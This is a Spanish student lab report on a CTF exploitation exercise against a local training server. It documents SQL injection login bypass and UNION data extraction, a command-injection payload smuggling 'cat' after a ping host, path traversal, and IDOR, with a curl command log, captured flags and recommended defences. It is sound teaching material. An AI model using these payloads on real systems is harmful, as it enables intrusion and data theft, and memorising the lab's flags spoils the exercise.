# Informe — Laboratorio 07 · Explotación

**Grupo:** 10 · **Integrantes:** Integrante 1 (@usuario1), Integrante 2 (@usuario2), Integrante 3 (@usuario3), Integrante 4 (@usuario4) · **Fecha:** 01/11/2026

---

## 0. Declaración de uso de IA

De acuerdo con lo establecido en `CONTRIBUTING.md`, se declara el uso asistido de herramientas de Inteligencia Artificial durante la resolución y elaboración de este informe:

- **Herramienta utilizada:** Asistente de IA (Claude + gemini/antigravity).
- **Finalidad del uso:** Planificación metodológica de auditoría de pruebas, diseño secuencial del protocolo de pruebas defensivas/analíticas, colaboración con la auditoría de la salida de CTF.
Todas las solicitudes HTTP fueron ejecutadas en vivo contra el entorno controlado Docker de PhantomCorp, verificándose empíricamente las respuestas del servidor web, las trazas de error del motor SQLite, la exfiltración efectiva de las tablas y la validación matemática/criptográfica de los hashes de las flags capturadas mediante el sistema oficial `./ctf submit 07`.

**Asistencia en la revisión de la Parte 5:** se utilizó OpenCode para revisar el informe y el código de `labs/lab07-explotacion/entorno/phantomcorp/server.py`. En esta sesión se levantó/recreó el contenedor local correcto del laboratorio y se ejecutaron solicitudes HTTP para R5 (id=3 y id=1). Se obtuvo la flag del endpoint y se comprobó su SHA-256 contra `retos.manifest`. La consola del atacante no pudo ejecutar `./ctf` por finales de línea CRLF en el script montado; por eso el estado de R5 se validó mediante el hash oficial del manifiesto, no mediante el comando `ctf submit`. R3 y R4 no se ejecutaron en esta sesión.

---

## 1. Flags capturadas

Estado acumulado documentado tras validar R1, R2 y R5. R1/R2 se acreditaron previamente y constan en `evidencia/salidas/ctf_status_final.txt`; R5 se validó después y consta en `evidencia/salidas/r5_submit_status.txt`. La vista 3/5 combina esas evidencias: no es una captura literal de una sola ejecución de `./ctf status 07` en el estado local actual:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ·  R3     Inyeccion de comandos (RCE)
   ·  R4     Path traversal / LFI
   ✓  R5     IDOR - control de acceso roto

  3/5 (60%)
```

- **Reto R1 (SQLi - bypass de autenticación):** `FLAG{sqli_auth_bypass}` (SHA-256: `9e8f2ecdbb0ad6fdbb0a7775e7a407fecd814d57a623a9aac20dd4767ac13537`)
- **Reto R2 (SQLi - extracción con UNION):** `FLAG{sqli_union_dump}` (SHA-256: `9f75841558e355415fff4d7de6b1e6c59671c1cfcecc71dfb7fb3632cadfd190`)
- **Reto R5 (IDOR - control de acceso roto):** `FLAG{idor_broken_access}` (SHA-256: `1a9fc5b9cbef488925fa1c4e1a4da376190a360c5978e0b40b92c1f11ed089b1`)

---

## 2. Tabla de explotación

**Alcance de la Parte 5:** R1, R2 y R5 fueron comprobados contra el contenedor local de PhantomCorp. Para R3 y R4 se proponen payloads y se reconstruye su efecto a partir del código fuente; **no se presentan como explotaciones realizadas**. R3 y R4 continúan pendientes de comprobación práctica.

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| **SQLi auth (R1)** | Documentado: `user=admin' --`, `pass=dummy`, en `POST /login`. | `SELECT user, rol FROM users WHERE user='admin' --' AND pass='dummy'` | El comentario elimina la comprobación de contraseña y permite obtener la respuesta del panel administrativo. El servidor del laboratorio no crea una sesión: devuelve el resultado del login en la respuesta. | Buscar al usuario mediante una consulta parametrizada y verificar su contraseña contra un hash seguro. No concatenar los valores recibidos con el SQL. |
| **SQLi UNION (R2)** | Documentado: `q=NOEXISTE' UNION SELECT clave, valor FROM secrets --`, en `GET /buscar`. | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%NOEXISTE' UNION SELECT clave, valor FROM secrets --%'` | Permite incorporar las columnas `clave` y `valor` de `secrets` a los resultados públicos del buscador, exponiendo información interna. | Mantener fija la consulta `SELECT nombre, precio FROM productos WHERE nombre LIKE ?` y enlazar como dato el patrón de búsqueda completo. Evitar exponer errores SQL al cliente como medida complementaria, no como solución principal. |
| **Command injection (R3)** | Propuesto, no ejecutado: `host=127.0.0.1; cat /app/flags/cmdi.txt`, en `GET /herramientas/ping`. | `ping -c1 127.0.0.1; cat /app/flags/cmdi.txt 2>&1` | El separador `;` permite que la shell ejecute una segunda instrucción con los permisos del proceso web y lea el archivo indicado. El alcance puede exceder esa lectura. | Evitar la shell y pasar el ejecutable y sus argumentos por separado. Validar el destino como una dirección IP permitida, impedir que se interprete como una opción y limitar tiempo de ejecución y privilegios. |
| **Path traversal (R4)** | Propuesto, no ejecutado: `archivo=../flags/lfi.txt`, en `GET /descargar`. | `/app/public/../flags/lfi.txt`, que se resuelve como `/app/flags/lfi.txt`. | Permite salir del directorio público y leer archivos ajenos a las descargas, siempre que el proceso web tenga permisos de lectura. | Preferir una lista de archivos descargables identificados por claves internas. Si se admiten rutas, resolverlas de forma canónica y comprobar pertenencia real al directorio público, considerando enlaces simbólicos; no basta comprobar un prefijo textual. |
| **IDOR (R5)** | Ejecutado: `GET /perfil?id=3` como referencia y luego `GET /perfil?id=1`, sin credenciales. | Consulta fija: `SELECT id,user,rol,nota_privada FROM users WHERE id=?`; para la segunda solicitud el parámetro enlazado es `("1",)`. | La respuesta 200 devuelve `user=admin`, `rol=admin` y `nota_privada` con `FLAG{idor_broken_access}`. Se expone información privada de otro usuario; esto no otorga por sí solo una sesión ni el rol de administrador al solicitante. | Autenticar al solicitante y autorizar cada lectura en el servidor antes de devolver datos. Para un perfil propio, derivar el identificador de la sesión validada; para consultar perfiles ajenos, exigir un permiso explícito. Denegar por defecto y devolver solo los campos necesarios. |

---

## 3. Preguntas de análisis

### P1 — Por qué funciona el bypass (con la query concreta)
En una arquitectura web vulnerable, la autenticación concatena de forma directa las cadenas recibidas en la solicitud HTTP dentro del texto de la instrucción SQL. En el endpoint `POST /login`, la consulta base sigue el formato:

```sql
SELECT user, rol FROM users WHERE user='<input_user>' AND pass='<input_pass>'
```

Para que una autenticación sea exitosa bajo este diseño, la cláusula `WHERE` requiere la satisfacción simultánea de dos condiciones booleanas unidas por el operador relacional `AND`:
$$\text{condición} = (\text{user} = \text{input\_user}) \land (\text{pass} = \text{input\_pass})$$

Al enviar en el parámetro de usuario el payload `admin' --`:
1. El primer carácter de comilla simple (`'`) cierra intencionalmente el literal de cadena que abrió el motor.
2. Los caracteres `--` constituyen la secuencia estándar del lenguaje SQL (y del motor SQLite) para iniciar un **comentario en línea**.
3. El motor de base de datos descarta e ignora la totalidad del texto sintáctico ubicado a la derecha del delimitador de comentario, incluyendo el apóstrofe de cierre residual, el operador lógico `AND` y la verificación de la contraseña (`AND pass = '...'`).

La sentencia interpretada y evaluada por el motor resulta:
```sql
SELECT user, rol FROM users WHERE user='admin'
```
Dado que existe un registro con `user='admin'`, la consulta devuelve su usuario y rol sin comprobar la contraseña. El backend acepta esa fila y devuelve el mensaje del panel administrativo. En esta implementación no se crea una sesión ni una cookie de autenticación: el bypass afecta la respuesta del login. El dato ingresado por el cliente rompió la frontera entre datos e instrucciones.

---

### P2 — Por qué el UNION necesita igual número de columnas y cómo averiguarlo
En el álgebra relacional, el operador de unión ($\cup$) combina las tuplas resultantes de dos relaciones o proyecciones. Para que la operación sea matemáticamente válida y procesable por un motor SQL (propiedad denominada *compatibilidad de unión* o *union-compatibility*):
1. Ambas subconsultas deben proyectar exactamente la misma **aridad** o **dimensionalidad** (idéntico número de columnas: $N_1 = N_2$).
2. Según el motor SQL, también pueden exigirse **tipos compatibles** en posiciones equivalentes. SQLite, utilizado en este laboratorio, admite mezclar valores de distintas clases de almacenamiento en un `UNION`; no debe confundirse esa flexibilidad con el requisito obligatorio de igual cantidad de columnas.

Si las consultas no poseen la misma cantidad de columnas, el optimizador sintáctico no puede hacer corresponder los campos en la estructura de la tupla resultante y aborta con un error inmediato de ejecución (ej. `SELECTs to the left and right of UNION do not have the same number of result columns`).

#### Metodología empírica para determinar el número de columnas:
Cuando no se dispone del código fuente ni de documentación del backend, existen dos técnicas sistemáticas:

1. **Inferencia mediante `ORDER BY`:**
   La cláusula `ORDER BY` permite ordenar el conjunto por el índice posicional (1-indexado) de las columnas devueltas. Se incrementa iterativamente el índice hasta provocar el primer fallo:
   - `q=' ORDER BY 1 --` $\rightarrow$ Respuesta válida (al menos 1 columna).
   - `q=' ORDER BY 2 --` $\rightarrow$ Respuesta válida (al menos 2 columnas).
   - `q=' ORDER BY 3 --` $\rightarrow$ En PhantomCorp devuelve: `Error SQL: 1st ORDER BY term out of range - should be between 1 and 2`.
   El último índice exitoso (o el límite inferior indicado por el error) establece fehacientemente que la consulta proyecta exactamente **2 columnas**.

2. **Inferencia mediante `UNION SELECT NULL` progresivo:**
   Consiste en probar de forma acumulativa literales nulos:
   - `q=' UNION SELECT NULL --` $\rightarrow$ Falla si $N \ne 1$.
   - `q=' UNION SELECT NULL, NULL --` $\rightarrow$ Éxito si $N = 2$.
    Usar `NULL` reduce los problemas de compatibilidad de tipos en muchos motores y ayuda a aislar la determinación del número de columnas. Los ejemplos anteriores describen el método; no se repitieron estas pruebas durante la revisión estática.

---

### P3 — Qué sigue después del RCE
*(Contexto de análisis según consigna)*
Después de obtener ejecución remota de comandos, un atacante podría identificar el usuario y los permisos del proceso comprometido, buscar secretos accesibles e intentar elevar privilegios. También podría buscar **persistencia**, es decir, conservar una vía de acceso aunque se cierre la conexión inicial, o usar el servidor como punto de acceso hacia otros sistemas internos.

Esas consecuencias dependen de los permisos y del aislamiento del servicio: RCE no equivale automáticamente a acceso como `root` ni a control del host que ejecuta Docker. En un pentest autorizado, cualquier prueba posterior debe estar incluida en el alcance acordado. En esta revisión no se ejecutaron comandos ni se estableció persistencia; R3 permanece pendiente de comprobación práctica.

---

### P4 — Por qué parametrizar mata la SQLi de raíz
Una consulta parametrizada mantiene separadas la **estructura SQL** y los **valores recibidos**. Por ejemplo, el buscador debe conservar fija esta instrucción:

```sql
SELECT nombre, precio FROM productos WHERE nombre LIKE ?
```

El patrón de búsqueda, incluidos sus `%`, se entrega por separado como valor del parámetro. Si ese valor contiene comillas, `UNION` o `--`, el motor los trata como parte del dato y no como instrucciones que puedan modificar la consulta.

La protección no depende de borrar caracteres peligrosos ni de que exista un paquete de red separado: SQLite funciona dentro del propio proceso. Lo importante es usar correctamente el enlace de parámetros y no concatenar la entrada con el SQL. Los parámetros representan valores, no nombres de tablas, columnas o palabras clave; si esos elementos deben variar, se seleccionan mediante una lista permitida definida por la aplicación.

Además, parametrizar evita esta SQLi, **pero no resuelve la autorización**: `/perfil` ya utiliza un parámetro y, aun así, presenta IDOR.

---

### P5 — Dónde va el control de acceso (IDOR)
El control de acceso no puede depender de que el cliente «no cambie el id» porque **el usuario controla la solicitud HTTP**. Puede modificar la URL o enviar una petición sin pasar por la interfaz. Ocultar el identificador, deshabilitar un campo o validar con JavaScript no impide solicitar otro perfil.

En R5, se consultó primero `/perfil?id=3` y se recibió el perfil `jperez` con HTTP 200. Luego se modificó a `/perfil?id=1`; sin autenticación, el servidor respondió HTTP 200 con el perfil `admin` y su `nota_privada`, que contiene `FLAG{idor_broken_access}`. El `id=3` predeterminado es solo un valor por defecto: **no demuestra la identidad del solicitante**. Las solicitudes y respuestas observadas se registran en `evidencia/salidas/r5_perfil_idor.txt`; la secuencia reproducible está en `evidencia/comandos.txt`.

La verificación debe hacerse **en el servidor, en cada solicitud y antes de devolver información protegida**:

1. **Autenticar:** obtener la identidad desde una sesión o credencial validada por el servidor, no desde el `id` recibido en la URL. El servidor actual no implementa sesiones; sería necesario incorporarlas o utilizar otro mecanismo de autenticación válido.
2. **Autorizar el objeto y la operación:** comprobar si esa identidad puede leer ese perfil y sus campos privados. Si la función es «mi perfil», usar directamente el identificador de la sesión. Si permite consultar perfiles ajenos, exigir un permiso explícito; no basta con que exista una sesión iniciada.
3. **Denegar por defecto:** si no hay autenticación, rechazar la solicitud; si faltan permisos, devolver `403 Forbidden` o un `404 Not Found` consistente para no revelar la existencia del recurso. No devolver la nota privada y ocultarla después en el navegador.

La consulta de R5 ya utiliza `WHERE id=?`, por lo que cambiar el valor a `1` no es una inyección SQL. Es una referencia válida a un objeto ajeno que el backend entrega sin autorización. Utilizar identificadores difíciles de adivinar puede dificultar su descubrimiento, pero **no sustituye el control de acceso**.

---

## 4. Bitácora de comandos reproducibles

A continuación se transcribe la secuencia de comandos utilizada para comprobar, explotar y validar los retos R1 y R2 contra el target:

```bash
# ==============================================================================
# SECUENCIA REPRODUCIBLE — RETOS 1 Y 2 (LAB 07)
# ==============================================================================

# 1. Comprobar que el endpoint /login rechaza solicitudes GET (POST-only)
curl -s -i http://phantomcorp/login

# 2. Establecer línea de base de credenciales inválidas (devolución 401 Unauthorized)
curl -s -i -X POST http://phantomcorp/login \
  --data-urlencode "user=admin" \
  --data-urlencode "pass=credencial_invalida_control"

# 3. Forzar error sintáctico SQL mediante comilla simple (evidencia SQLite: near "test": syntax error)
curl -s -i -X POST http://phantomcorp/login \
  --data-urlencode "user='" \
  --data-urlencode "pass=test"

# 4. Explotar Reto 1: Bypass de autenticación mediante comentario SQL y captura de flag
curl -s -i -X POST http://phantomcorp/login \
  --data-urlencode "user=admin' --" \
  --data-urlencode "pass=dummy"

# 5. Envío y acreditación de flag R1
./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'

# ------------------------------------------------------------------------------

# 6. Establecer línea de base en búsqueda de catálogo normal (Reto 2)
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=Router"

# 7. Forzar error sintáctico de delimitador en búsqueda (evidencia: unrecognized token: "'")
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q='"

# 8. Comprobar inyección booleana en q (recuperación de todo el catálogo)
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=' OR '1'='1' --"

# 9. Determinar dimensionalidad mediante ORDER BY (1 y 2 válidos; 3 falla con out of range)
curl -s -i -G http://phantomcorp/buscar --data-urlencode "q=' ORDER BY 1 --"
curl -s -i -G http://phantomcorp/buscar --data-urlencode "q=' ORDER BY 2 --"
curl -s -i -G http://phantomcorp/buscar --data-urlencode "q=' ORDER BY 3 --"

# 10. Validar compatibilidad de tipos y canal reflejado en las 2 columnas
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=NOEXISTE' UNION SELECT 'COLUMNA_UNO', 'COLUMNA_DOS' --"

# 11. Descubrir esquema de la base de datos consultando sqlite_master
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=NOEXISTE' UNION SELECT sql, '' FROM sqlite_master WHERE type='table' --"

# 12. Explotar Reto 2: Extracción con proyección explícita (clave, valor) de secrets y captura de flag
curl -s -i -G http://phantomcorp/buscar \
  --data-urlencode "q=NOEXISTE' UNION SELECT clave, valor FROM secrets --"

# 13. Envío y acreditación de flag R2
./ctf submit 07 R2 'FLAG{sqli_union_dump}'

# 14. Verificar estado de avance luego de R1 y R2 (captura previa a R5)
./ctf status 07

# --- RETO 5: IDOR ---
# Solicitud de referencia y modificación del identificador; ver evidencia R5.
curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=3"
curl -sS -i -G http://phantomcorp/perfil --data-urlencode "id=1"
./ctf submit 07 R5 'FLAG{idor_broken_access}'
./ctf status 07
```

